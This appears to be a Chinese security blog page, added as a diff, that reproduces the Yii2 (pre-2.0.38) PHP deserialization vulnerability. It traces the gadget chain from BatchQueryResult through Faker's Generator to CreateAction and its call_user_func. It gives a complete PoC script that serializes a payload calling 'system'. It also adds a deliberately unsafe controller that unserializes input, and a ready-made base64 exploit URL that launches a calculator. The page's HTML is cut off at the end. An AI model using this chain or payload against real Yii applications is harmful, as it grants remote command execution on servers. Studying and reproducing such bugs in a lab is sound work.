@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":"default","style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta property="og:type" content="article">
+<meta property="og:title" content="yii反序列化">
+<meta property="og:url" content="http://example.com/2023/10/24/yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/09/15/8ac13aee0e90f547.png">
+<meta property="article:published_time" content="2023-10-24T04:16:12.000Z">
+<meta property="article:modified_time" content="2023-10-26T07:47:09.303Z">
+<meta property="article:author" content="小zhou">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s3.bmp.ovh/imgs/2023/09/15/8ac13aee0e90f547.png">
+
+<link rel="canonical" href="http://example.com/2023/10/24/yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>yii反序列化 | blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/24/yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/QQ%E5%9B%BE%E7%89%8720230109005650.jpg">
+      <meta itemprop="name" content="小zhou">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          yii反序列化
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-10-24 12:16:12" itemprop="dateCreated datePublished" datetime="2023-10-24T12:16:12+08:00">2023-10-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-10-26 15:47:09" itemprop="dateModified" datetime="2023-10-26T15:47:09+08:00">2023-10-26</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>816</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p> <img src="https://s3.bmp.ovh/imgs/2023/09/15/8ac13aee0e90f547.png"></p>
+<span id="more"></span>
+
+<h1 id="yii-反序列化漏洞复现"><a href="#yii-反序列化漏洞复现" class="headerlink" title="yii 反序列化漏洞复现"></a>yii 反序列化漏洞复现</h1><p>Yii 是一个通用的 Web 编程框架，即可以用于开发各种用 PHP 构建的 Web 应用。 因为基于组件的框架结构和设计精巧的缓存支持，它特别适合开发大型应用， 如门户网站、社区、内容管理系统(CMS)、 电子商务项目和 RESTful Web 服务等。</p>
+<h2 id="环境搭建yii2-0-37"><a href="#环境搭建yii2-0-37" class="headerlink" title="环境搭建yii2.0.37"></a>环境搭建yii2.0.37</h2><p>yii2.0.38之前的版本中</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/yiisoft/yii2/releases/download/2.0.37/yii-basic-app-2.0.37.tgz">yii-basic-app-2.0.37.tgz</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/yiisoft/yii2/releases/tag/2.0.37</span><br></pre></td></tr></table></figure>
+
+<p>然后修改&#x2F;config&#x2F;web.php文件17行cookieValidationKey,可以随便定义</p>
+<p>进入当前目录 执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php yii serve</span><br></pre></td></tr></table></figure>
+
+<p>然后访问 127.0.0.1:8080环境搭建完成，</p>
+<h2 id="namespacce简述"><a href="#namespacce简述" class="headerlink" title="namespacce简述"></a>namespacce简述</h2><p>PHP 命名空间(namespace)是在 PHP 5.3 中加入的，目的是解决重名问题，PHP中不允许两个函数或者类出现相同的名字，否则会产生一个致命的错误。</p>
+<p>PHP 命名空间可以解决以下两类问题：</p>
+<ol>
+<li>用户编写的代码与PHP内部的类&#x2F;函数&#x2F;常量或第三方类&#x2F;函数&#x2F;常量之间的名字冲突。</li>
+<li>为很长的标识符名称(通常是为了缓解第一类问题而定义的)创建一个别名（或简短）的名称，提高源代码的可读性。</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.namespaces.rationale.php">PHP: 命名空间概述 - Manual</a></p>
+<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>利用点在</p>
+<p>basic&#x2F;vendor&#x2F;yiisoft&#x2F;yii2&#x2F;db&#x2F;BatchQueryResult.php</p>
+<p>中的BatchQueryResult-&gt;__destruct()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// make sure cursor is closed</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">reset</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">reset</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;_dataReader !== <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_dataReader-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_dataReader = <span class="literal">null</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_batch = <span class="literal">null</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_value = <span class="literal">null</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_key = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里close 文件只有一处调用，所以不考虑，搜索文件中的_calll 方法</p>
+<p><strong>当调用类中不存在的方法时就会调用__call</strong>，此时__call 传入一个值为close</p>
+<p>basic&#x2F;vendor&#x2F;fzaninotto&#x2F;faker&#x2F;src&#x2F;Faker&#x2F;Generator.php中的</p>
+<p>class Generator-&gt;__call();</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$attributes</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">format</span>(<span class="variable">$method</span>, <span class="variable">$attributes</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>即$method &#x3D;close,即$formatter&#x3D;close</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params"><span class="variable">$formatter</span>, <span class="variable">$arguments</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getFormatter</span>(<span class="variable">$formatter</span>), <span class="variable">$arguments</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>$formatter</code>与<code>$arguments</code>我们都不可控$formatter&#x3D;close,$arguments值为空</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params"><span class="variable">$formatter</span>, <span class="variable">$arguments</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getFormatter</span>(<span class="variable">$formatter</span>), <span class="variable">$arguments</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_37866091/article/details/122128344">PHP函数详解：call_user_func() 与 call_user_func_array()使用方法_call_user_func以及call_user_fun_array-CSDN博客</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span>(<span class="params"><span class="variable">$formatter</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$formatter</span>])) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$formatter</span>];</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;providers <span class="keyword">as</span> <span class="variable">$provider</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$provider</span>, <span class="variable">$formatter</span>)) &#123;</span><br><span class="line">             <span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$formatter</span>] = <span class="keyword">array</span>(<span class="variable">$provider</span>, <span class="variable">$formatter</span>);</span><br><span class="line"></span><br><span class="line">             <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$formatter</span>];</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\InvalidArgumentException</span>(<span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;Unknown formatter &quot;%s&quot;&#x27;</span>, <span class="variable">$formatter</span>));</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$providers</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$formatters</span> = <span class="keyword">array</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>$this-&gt;formatters 是可以控制的，也就意味着<code>getFormatter</code>方法的返回值是可控的。</p>
+<p>这里$this-&gt;formatters[‘close’] &#x3D; [new CreateAction(), ‘run’];</p>
+<p><code>all_user_func_array</code>这个函数的第一个参数可控，第二个参数为空</p>
+<p>basic&#x2F;vendor&#x2F;yiisoft&#x2F;yii2&#x2F;rest&#x2F;IndexAction.php中的IndexAction-&gt;run() 方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;checkAccess) &#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;checkAccess, <span class="variable">$this</span>-&gt;id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">prepareDataProvider</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;dir&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>到这里链子构建成功</p>
+<p>但没有接口在controllers 下建立文件Testcontrollers.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">controllers</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Yii</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">filters</span>\<span class="title">VervFilter</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">filters</span>\<span class="title">AccessControl</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">models</span>\<span class="title">LoginForm</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestController</span> <span class="keyword">extends</span> \<span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionSss</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后，访问，弹出计算器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/index.php?r=test/sss&amp;data=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6Njoic3lzdGVtIjtzOjI6ImlkIjtzOjQ6ImNhbGMiO31pOjE7czozOiJydW4iO319fX0=</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/thresh/p/13743081.html">Yii反序列化漏洞分析 - Thresh｜ - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU5MDI0ODI5MQ==&mid=2247485129&idx=1&sn=b27e3fe845daee2fb13bb9f36f53ab40">我是怎么挖掘yii2反序列化0day的 (qq.com)</a></p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>三天饿九顿，讨点饭吃。</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="小zhou 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.png" alt="小zhou 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/10/22/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E7%A9%BF%E9%80%8F/" rel="prev" title="内网代理穿透">
+      <i class="fa fa-chevron-left"></i> 内网代理穿透
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#yii-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.</span> <span class="nav-text">yii 反序列化漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAyii2-0-37"><span class="nav-number">1.1.</span> <span class="nav-text">环境搭建yii2.0.37</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#namespacce%E7%AE%80%E8%BF%B0"><span class="nav-number">1.2.</span> <span class="nav-text">namespacce简述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-number">1.3.</span> <span class="nav-text">代码审计</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#poc"><span class="nav-number">1.4.</span> <span class="nav-text">poc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">1.5.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="小zhou"
